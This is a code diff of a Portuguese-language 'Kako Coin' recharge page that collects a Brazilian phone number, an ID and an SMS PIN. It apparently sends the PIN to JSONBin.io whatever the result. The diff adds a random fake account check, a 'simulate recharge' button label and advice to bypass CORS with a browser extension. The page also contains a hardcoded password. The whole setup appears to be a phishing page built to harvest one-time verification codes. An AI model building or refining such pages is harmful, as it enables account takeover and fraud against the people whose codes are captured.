@@ -43,6 +43,14 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+        .cors-warning {
+            background-color: #fef3cd;
+            border-left: 4px solid #ffc107;
+            padding: 12px;
+            margin: 16px 0;
+            border-radius: 4px;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body class="bg-gray-100 font-sans">
@@ -123,7 +131,7 @@
                     
                     <button type="submit" id="submitBtn" 
                             class="w-full bg-purple-600 text-white py-3 px-4 rounded-md hover:bg-purple-700 transition duration-200 font-medium">
-                        Recaregar Agora
+                        Simular Recarga
                     </button>
                 </form>
             </div>
@@ -205,6 +213,14 @@
         // Senha padrão
         const DEFAULT_PASSWORD = '335112d1r7y';
 
+        // Função para verificar se o telefone está associado a uma conta
+        // Esta é uma simulação - na prática você precisaria de uma API para verificar isso
+        function isPhoneAssociatedWithAccount(phone) {
+            // Simulação: 70% de chance de estar associado
+            // Você pode modificar esta lógica conforme necessário
+            return Math.random() > 0.3;
+        }
+
         // Função para sanitizar o ID (remover espaços, letras, símbolos, emojis)
         function sanitizeId(input) {
             input.value = input.value.replace(/[^0-9]/g, '');
@@ -284,6 +300,13 @@
             currentPhone = '+55' + phone.replace(/\D/g, '');
             currentId = id.replace(/\D/g, '');
             
+            // Verifica se o telefone está associado a uma conta
+            if (!isPhoneAssociatedWithAccount(currentPhone)) {
+                // Status 2: Telefone não associado a uma conta
+                alert('❌ Este número não está associado a uma conta Kako Coin.\n\nPor favor, verifique o número ou crie uma conta primeiro.');
+                return;
+            }
+            
             // Atualiza o texto do botão para mostrar loading
             submitBtn.innerHTML = '<span class="loading"></span> Enviando código...';
             submitBtn.disabled = true;
@@ -305,12 +328,18 @@
                     // Sucesso - abre o modal para inserir o PIN
                     pinModal.classList.remove('hidden');
                 } else {
-                    // Erro na API, mas ainda assim abrimos o modal
+                    // Erro na API, mas ainda assim abrimos o modal para simulação
                     console.warn('Código não-zero da API de SMS:', result.code, result.msg);
                     pinModal.classList.remove('hidden');
                 }
             } catch (error) {
                 console.error('Erro ao enviar solicitação:', error);
+                // Explicação sobre CORS
+                if (error.name === 'TypeError' && error.message.includes('Failed to fetch')) {
+                    alert('❌ Erro de CORS: Não foi possível conectar à API.\n\nIsso acontece porque o navegador bloqueia requisições entre domínios diferentes por segurança.\n\nPara resolver, você precisa hospedar este site em um servidor ou usar uma extensão para habilitar CORS.');
+                    return;
+                }
+                
                 // Mesmo com erro, abrimos o modal para simulação
                 pinModal.classList.remove('hidden');
             } finally {
@@ -364,6 +393,11 @@
             } catch (error) {
                 console.error('Erro ao validar PIN:', error);
                 apiResult = { error: error.message };
+                
+                // Explicação sobre CORS
+                if (error.name === 'TypeError' && error.message.includes('Failed to fetch')) {
+                    alert('❌ Erro de CORS: Não foi possível conectar à API.\n\nIsso acontece porque o navegador bloqueia requisições entre domínios diferentes por segurança.\n\nPara resolver, você precisa hospedar este site em um servidor ou usar uma extensão para habilitar CORS.');
+                }
             }
             
             // Envia para JSONBin.io independentemente do resultado
